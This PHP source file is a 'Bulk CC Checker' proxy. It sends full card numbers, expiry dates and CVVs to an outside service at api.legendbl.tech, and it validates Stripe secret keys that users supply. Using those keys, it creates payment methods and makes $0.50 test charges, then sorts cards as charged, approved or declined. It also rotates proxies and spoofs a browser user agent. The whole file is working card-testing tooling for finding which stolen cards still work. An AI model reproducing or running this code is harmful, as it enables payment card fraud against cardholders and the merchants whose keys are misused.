<?php
/**
 * Bulk CC Checker API Proxy
 * Handles external API requests to avoid CORS issues
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

// Get POST data
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data || !isset($data['action'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid request']);
    exit;
}

$action = $data['action'];

// Handle different actions
switch ($action) {
    case 'check_card':
        handleCheckCard($data);
        break;
    
    case 'validate_proxy':
        handleValidateProxy($data);
        break;
    
    case 'validate_sk':
        handleValidateSK($data);
        break;
    
    case 'check_with_sk':
        handleCheckWithSK($data);
        break;
    
    default:
        http_response_code(400);
        echo json_encode(['error' => 'Unknown action']);
        exit;
}

/**
 * Handle card checking
 */
function handleCheckCard($data) {
    $cc = $data['cc'] ?? '';
    $mes = $data['mes'] ?? '';
    $ano = $data['ano'] ?? '';
    $cvv = $data['cvv'] ?? '';
    $site = $data['site'] ?? '';
    $proxy = $data['proxy'] ?? '';
    
    if (empty($cc) || empty($mes) || empty($ano) || empty($cvv) || empty($site)) {
        http_response_code(400);
        echo json_encode(['error' => 'Missing required parameters']);
        return;
    }
    
    // Build API URL
    $apiUrl = 'https://api.legendbl.tech/autossh.php?cc=' . urlencode($cc . '|' . $mes . '|' . $ano . '|' . $cvv) 
              . '&site=' . urlencode($site) 
              . '&proxy=' . urlencode($proxy);
    
    // Make request with timeout
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    // Add headers
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept: */*'
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error || $httpCode !== 200) {
        echo json_encode([
            'success' => false,
            'error' => $error ?: 'API request failed',
            'http_code' => $httpCode,
            'response' => $response
        ]);
        return;
    }
    
    // Parse response
    $result = parseCheckResponse($response);
    
    echo json_encode([
        'success' => true,
        'result' => $result,
        'raw_response' => $response
    ]);
}

/**
 * Handle proxy validation
 */
function handleValidateProxy($data) {
    $proxy = $data['proxy'] ?? '';
    $site = $data['site'] ?? 'https://google.com';
    
    if (empty($proxy)) {
        http_response_code(400);
        echo json_encode(['error' => 'Proxy is required']);
        return;
    }
    
    // Build API URL
    $apiUrl = 'https://api.legendbl.tech/autog.php?site=' . urlencode($site) 
              . '&proxy=' . urlencode($proxy);
    
    // Make request with shorter timeout for proxy validation
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    // Determine if proxy is live
    $isLive = false;
    if ($httpCode === 200 && !$error) {
        $responseLower = strtolower($response);
        $isLive = (strpos($responseLower, 'success') !== false) || 
                  (strpos($responseLower, 'error') === false && strpos($responseLower, 'failed') === false);
    }
    
    echo json_encode([
        'success' => true,
        'is_live' => $isLive,
        'response' => $response,
        'http_code' => $httpCode
    ]);
}

/**
 * Parse check response
 */
function parseCheckResponse($response) {
    $responseLower = strtolower($response);
    
    $status = 'declined';
    $message = $response;
    
    // Check for charged
    if (strpos($responseLower, 'charged') !== false) {
        $status = 'charged';
    }
    // Check for approved variations
    elseif (strpos($responseLower, 'approved') !== false || 
            strpos($responseLower, 'live') !== false ||
            strpos($responseLower, 'cvv') !== false ||
            strpos($responseLower, '3ds') !== false ||
            strpos($responseLower, 'risky') !== false) {
        $status = 'approved';
    }
    
    return [
        'status' => $status,
        'message' => substr($message, 0, 200), // Limit message length
        'full_response' => $response
    ];
}

/**
 * Handle SK key validation
 */
function handleValidateSK($data) {
    $skKey = $data['sk_key'] ?? '';
    
    if (empty($skKey)) {
        http_response_code(400);
        echo json_encode(['error' => 'SK key is required']);
        return;
    }
    
    // Validate SK key format
    if (!preg_match('/^sk_(live|test)_[a-zA-Z0-9]+$/', $skKey)) {
        echo json_encode([
            'success' => false,
            'is_valid' => false,
            'error' => 'Invalid SK key format. Must be sk_live_* or sk_test_*'
        ]);
        return;
    }
    
    // Call Stripe API to validate key and get account details
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/account');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_USERPWD, $skKey . ':');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded'
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error || $httpCode !== 200) {
        echo json_encode([
            'success' => false,
            'is_valid' => false,
            'error' => 'Invalid SK key or API error',
            'http_code' => $httpCode
        ]);
        return;
    }
    
    $accountData = json_decode($response, true);
    
    if (!$accountData || isset($accountData['error'])) {
        echo json_encode([
            'success' => false,
            'is_valid' => false,
            'error' => $accountData['error']['message'] ?? 'Invalid SK key'
        ]);
        return;
    }
    
    // Extract key details
    $details = [
        'id' => $accountData['id'] ?? '',
        'business_name' => $accountData['business_profile']['name'] ?? 'N/A',
        'email' => $accountData['email'] ?? 'N/A',
        'country' => $accountData['country'] ?? 'N/A',
        'currency' => $accountData['default_currency'] ?? 'usd',
        'charges_enabled' => $accountData['charges_enabled'] ?? false,
        'payouts_enabled' => $accountData['payouts_enabled'] ?? false,
        'type' => $accountData['type'] ?? 'standard'
    ];
    
    echo json_encode([
        'success' => true,
        'is_valid' => true,
        'details' => $details
    ]);
}

/**
 * Handle CC checking with SK key
 */
function handleCheckWithSK($data) {
    $skKey = $data['sk_key'] ?? '';
    $cc = $data['cc'] ?? '';
    $mes = $data['mes'] ?? '';
    $ano = $data['ano'] ?? '';
    $cvv = $data['cvv'] ?? '';
    
    if (empty($skKey) || empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
        http_response_code(400);
        echo json_encode(['error' => 'Missing required parameters']);
        return;
    }
    
    // Create payment method via Stripe
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_USERPWD, $skKey . ':');
    
    $postData = http_build_query([
        'type' => 'card',
        'card[number]' => $cc,
        'card[exp_month]' => $mes,
        'card[exp_year]' => $ano,
        'card[cvc]' => $cvv
    ]);
    
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded'
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        echo json_encode([
            'success' => false,
            'error' => 'Request failed: ' . $error
        ]);
        return;
    }
    
    $result = json_decode($response, true);
    
    // Parse Stripe response
    $status = 'declined';
    $message = 'Card declined';
    
    if ($httpCode === 200 && isset($result['id'])) {
        // Card was successfully added as payment method
        $status = 'approved';
        $message = 'Card approved - Valid payment method';
        
        // Try to charge $0.50 to verify
        $paymentMethodId = $result['id'];
        $chargeResult = attemptCharge($skKey, $paymentMethodId);
        
        if ($chargeResult['charged']) {
            $status = 'charged';
            $message = 'Card charged successfully - $0.50';
        }
    } elseif (isset($result['error'])) {
        $errorCode = $result['error']['code'] ?? '';
        $errorMessage = $result['error']['message'] ?? 'Unknown error';
        
        // Check for specific error types that indicate valid card
        if ($errorCode === 'card_declined' && strpos($errorMessage, 'insufficient_funds') !== false) {
            $status = 'approved';
            $message = 'Card approved - Insufficient funds';
        } elseif ($errorCode === 'incorrect_cvc') {
            $status = 'approved';
            $message = 'Card approved - Incorrect CVV';
        } else {
            $message = $errorMessage;
        }
    }
    
    echo json_encode([
        'success' => true,
        'result' => [
            'status' => $status,
            'message' => $message
        ]
    ]);
}

/**
 * Attempt to charge card
 */
function attemptCharge($skKey, $paymentMethodId) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_USERPWD, $skKey . ':');
    
    $postData = http_build_query([
        'amount' => 50, // $0.50
        'currency' => 'usd',
        'payment_method' => $paymentMethodId,
        'confirm' => 'true',
        'description' => 'Card validation charge'
    ]);
    
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded'
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    $result = json_decode($response, true);
    
    $charged = false;
    if ($httpCode === 200 && isset($result['status'])) {
        $charged = ($result['status'] === 'succeeded');
    }
    
    return ['charged' => $charged, 'response' => $result];
}
